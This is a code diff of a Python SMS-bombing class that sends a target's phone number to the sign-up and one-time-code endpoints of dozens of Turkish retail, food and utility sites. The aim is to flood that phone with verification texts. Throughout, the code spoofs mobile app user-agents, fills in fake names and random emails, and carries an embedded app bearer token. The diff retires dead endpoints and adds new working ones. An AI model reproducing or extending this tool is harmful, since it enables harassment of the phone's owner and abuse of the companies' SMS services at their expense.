@@ -3,7 +3,6 @@ from random import choice
 from string import ascii_lowercase
 from bs4 import BeautifulSoup
 from colorama import Fore, Style
-from json import dumps
 
 class SendSms():
     random_mail = ''.join(choice(ascii_lowercase) for i in range(20))
@@ -14,34 +13,19 @@ class SendSms():
 
     
     #borsadirekt.com--sms
-    def borsaDirekt(self):
-        try:
-            borsadirekt = requests.post("https://www.borsadirekt.com/uye-ol-ilk-adim", data={
-                "__EVENTTARGET": "",
-                "__EVENTARGUMENT": "",
-                "__VIEWSTATE": "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",
-                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$txtRegisterUserName": "Memati",
-                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$txtRegisterSurName": "Bas",
-                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$txtRegisterUserEmail": f"{self.random_mail}@gmail.com",
-                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$drpCity": "34",
-                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$txtRegisterUserPassword": "31ABC..abc31",
-                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$txtRegisterUserConfirmPassword": "31ABC..abc31",
-                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$drpMobilOperator": "501",
-                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$txtRegisterUserPhoneNumber": self.phone,
-                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$CheckOK": "on",
-                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$chAdwords": "on",
-                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$CreateUserSubmit": "ÜYE+OL",
-                "zc_gad": "undefined",
-                "__VIEWSTATEGENERATOR": "A8BD42AF",
-                "__EVENTVALIDATION": "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"
-            })
-            if borsadirekt.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> borsadirekt.com")
-                self.adet += 1
-            else:
-                raise
-        except:    
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> borsadirekt.com")
+    # def borsaDirekt(self):
+    #     try:
+    #         url = "https://m.borsadirekt.com:443/Register"
+    #         headers = {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://m.borsadirekt.com", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Referer": "https://m.borsadirekt.com/Register", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
+    #         data = {"FirstName": "Memati", "Lastname": "Bas", "PhoneNumber": self.phone, "Email": f"{self.random_mail}@gmail.com", "CityName": "istanbul", "Address": "address", "Password": "31ABC..abc31", "chkKvvk": "on", "chAdwords": "on"}
+    #         r = requests.post(url, headers=headers, data=data, allow_redirects=False)
+    #         if r.status_code == 302:
+    #             print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> borsadirekt.com")
+    #             self.adet += 1
+    #         else:
+    #             raise
+    #     except:    
+    #         print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> borsadirekt.com")
         
         
     # dsmartgo.com.tr--sms--zaman-3dk
@@ -104,27 +88,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kigili.com")
         
 
-    # market.sleepy.com.tr--sms
-    def sleepy(self):    
-        try:
-            sleepy = requests.post("https://market.sleepy.com.tr/Customer/SendCode/", data={
-                "phoneNumber": f"0{self.phone}",
-                "firstName": "Memati", 
-                "lastName": "Bas",
-                "email": f"{self.random_mail}@gmail.com",
-                "type": "customer",
-                "registerType": "1",
-                "campaingPermission": "true"
-            })
-            if sleepy.json()["success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> sleepy.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> sleepy.com.tr")
-        
-
     #kahvedunyasi.com--sms--zaman-1dk
     def kahveDunyasi(self):    
         try:    
@@ -141,42 +104,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kahvedunyasi.com")
         
  
-    # babyturco.com--sms
-    def babyTurco(self):    
-        try:
-            baby_turco = requests.post("https://market.babyturco.com.tr/Customer/SendCode/", data={
-                "phoneNumber": f"0{self.phone}",
-                "firstName": "Memati",
-                "lastName": "Bas",
-                "email": f"{self.random_mail}@gmail.com",
-                "type": "customer",
-                "campaingPermission": "true"
-            })
-            if baby_turco.json()["success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> babyturco.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> babyturco.com.tr")
-        
-
-    # petrolofisi.com.tr--sms
-    def petrolOfisi(self):
-        try:    
-            url = "https://onlineislemler.petrolofisi.com.tr:443/Authentication/Register"
-            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://onlineislemler.petrolofisi.com.tr", "Dnt": "1", "Referer": "https://onlineislemler.petrolofisi.com.tr/authentication/login?ReturnUrl=%2F", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
-            data = {"name": "Memati", "surname": "Bas", "phone": f"0{self.phone}", "referenceCode": '', "cardNo": '', "plate": "31ABC31", "contractPermission": "true", "contactPermission": "true", "kvkkPermission": "true"}
-            petrol_ofisi = requests.post(url, headers=headers, data=data)
-            if petrol_ofisi.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> petrolofisi.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> petrolofisi.com.tr")
-        
-
     #podyumplus.com--sms
     def podyumPlus(self):    
         try:
@@ -233,10 +160,8 @@ class SendSms():
     #ohalisaha.com--sms   
     def ohaliSaha(self):
         try:
-            ohalisaha = requests.post("https://ohalisaha.com/Uye/OnayKoduGonder", data={
-                "tel": self.phone
-            })
-            if ohalisaha.status_code == 200:
+            r = requests.post("https://sporpin.com:443/Uye/OnayKoduGonder",  data={"tel": self.phone})
+            if (r.json()["d"]) == "e":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ohalisaha.com")
                 self.adet += 1  
             else:
@@ -267,35 +192,7 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> wmf.com.tr")
          
-            
-    #vans.com.tr--sms--zaman-15dk
-    def vans(self):
-        try:
-            vans =  requests.post("https://www.vans.com.tr/Uye/CheckPhoneAndSendSms", data={
-                "phone": self.phone
-            })
-            if vans.json()["message"] == "Sms Gönderildi":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> vans.com.tr")
-                self.adet += 1  
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> vans.com.tr")
-          
     
-    #eastpak.com.tr--sms--zaman-15dk
-    def eastpak(self):
-        try:
-            eastpak = requests.post(f"https://www.eastpak.com.tr/Uye/CheckPhoneAndSendSms?phone={self.phone}")
-            if eastpak.json()["message"] == "Sms Gönderildi":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> eastpak.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> eastpak.com.tr") 
-
-
     #istegelsin.com--sms--zaman-2dk
     def isteGelsin(self):
         try:
@@ -531,20 +428,7 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> yaanimail.com")  
             
-            
-    #mcdonalds.com.tr
-    def Mcdonalds(self):
-        try:
-            r = requests.get(f"https://siparis.mcdonalds.com.tr/login/SendSMSOtp?phone={self.phone}&smsPermit=1&epostaPermit=1")
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mcdonalds.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mcdonalds.com.tr")
-            
-    
+             
     #defacto.com.tr
     def Defacto(self):
         try:
@@ -692,3 +576,105 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> buyursungelsin.com")
+            
+    
+    #osmgck.idealdata.com.tr
+    def Osmanlideal(self):
+        try:
+            r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.random_mail}@gmail.com%020{self.phone}")
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> osmgck.idealdata.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> osmgck.idealdata.com.tr")
+            
+    
+    #pinarsumobileservice.yasar.com.tr
+    def Pinar(self):
+        try:
+            url = "https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp"
+            headers = {"Content-Type": "application/json", "Devicetype": "ios", "Accept": "*/*", "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Level": "40202", "Accountid": "062511D3-BF52-4441-A29B-8250E3900931", "Accept-Encoding": "gzip, deflate", "User-Agent": "Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2", "Languageid": "D4FF115D-1AB5-4141-8719-A102C3CF9F1E", "Connection": "close"}
+            json={"MobilePhone": self.phone}
+            r = requests.post(url, headers=headers, json=json)
+            if r.text == "true":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> pinarsumobileservice.yasar.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> pinarsumobileservice.yasar.com.tr")
+            
+    
+    #suiste.com
+    def Suiste(self):
+        try:
+            url = "https://suiste.com:443/api/auth/code"
+            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
+            data = {"action": "register", "gsm": self.phone}
+            r = requests.post(url, headers=headers, data=data)
+            if r.json()["code"] == "common.success":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> suiste.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> suiste.com")
+            
+            
+    #suburada.com
+    def Suburada(self):
+        try:
+            url = "https://panel.suburada.com.tr:443/api/customers/verifyPhone"
+            headers = {"Accept": "application/json", "Content-Type": "application/json;charset=utf-8", "Accept-Currency": "TRY", "Authorization": "Bearer null", "Accept-Encoding": "gzip, deflate", "User-Agent": "SuBurada/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
+            json={"phone_number": self.phone}
+            r = requests.post(url, headers=headers, json=json)
+            if r.json()["error"] == False:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> suburada.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> suburada.com")
+            
+    
+    #hayatsu.com.tr--günde 2 kez
+    def Hayat(self):
+        try:
+            url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
+            json={"mobilePhoneNumber": self.phone}
+            r = requests.post(url, json=json)
+            if (r.json()["IsSuccessful"]) == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> hayatsu.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> hayatsu.com.tr")
+            
+            
+    #pisir.com
+    def Pisir(self):
+        try:
+            r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "336", "app_platform": "ios", "msisdn": f"+90{self.phone}"})
+            if r.json()["ok"] == "1":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> pisir.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> pisir.com")
+                
+    
+    #KimGbIster
+    def KimGb(self):
+        try:
+            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"})
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> KimGbIster")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> KimGbIster")
